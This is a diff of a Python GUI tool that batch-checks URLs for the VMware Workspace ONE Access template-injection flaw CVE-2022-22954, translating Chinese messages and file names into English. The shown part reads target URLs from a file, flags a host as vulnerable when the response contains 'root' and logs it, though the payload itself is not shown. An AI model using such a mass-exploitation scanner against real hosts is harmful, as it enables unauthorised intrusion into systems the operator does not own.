@@ -11,18 +11,18 @@ def vmware_one_access_ssti_exp(url):
     try:
         res = requests.get(url, verify=False, timeout=3)
         if "root" in res.text:
-            vmware_one_access_ssti_text.insert(END,"---------------------------------------\n【！！！！！！】存在漏洞的url：" + url + "\n---------------------------------------\n")
+            vmware_one_access_ssti_text.insert(END,"---------------------------------------\n[! ! ! ! ! ! ] Vulnerable url:" + url + "\n---------------------------------------\n")
             vmware_one_access_ssti_text.see(END)
-            with open ("存在VMware服务端模板注入漏洞(CVE-2022-22954)的url.txt", 'a') as f:
+            with open ("[exists]VMware_CVE_2022_22954_url.txt", 'a') as f:
                 f.write(url + "\n")
         else:
-            vmware_one_access_ssti_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
+            vmware_one_access_ssti_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
             vmware_one_access_ssti_text.see(END)
     except Exception as err:
-        vmware_one_access_ssti_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
+        vmware_one_access_ssti_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
         vmware_one_access_ssti_text.see(END)
 def get_vmware_one_access_ssti_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
@@ -31,7 +31,7 @@ def vmware_one_access_ssti_gui():
     vmware_one_access_ssti.geometry("1035x455")
     logo = PhotoImage(file="./logo.ico")
     vmware_one_access_ssti.tk.call('wm', 'iconphoto', vmware_one_access_ssti._w, logo)
-    vmware_one_access_ssti.title("VMware服务端模板注入漏洞(CVE-2022-22954)一把梭【注意：验证该漏洞时请关注您网页F12下的控制台输出内容！】")
+    vmware_one_access_ssti.title("VMware Server-side template injection(CVE-2022-22954) [auto-muti-exp]")
     vmware_one_access_ssti.resizable(0, 0)
     global vmware_one_access_ssti_text
     vmware_one_access_ssti_text = scrolledtext.ScrolledText(vmware_one_access_ssti,width=123, height=25)
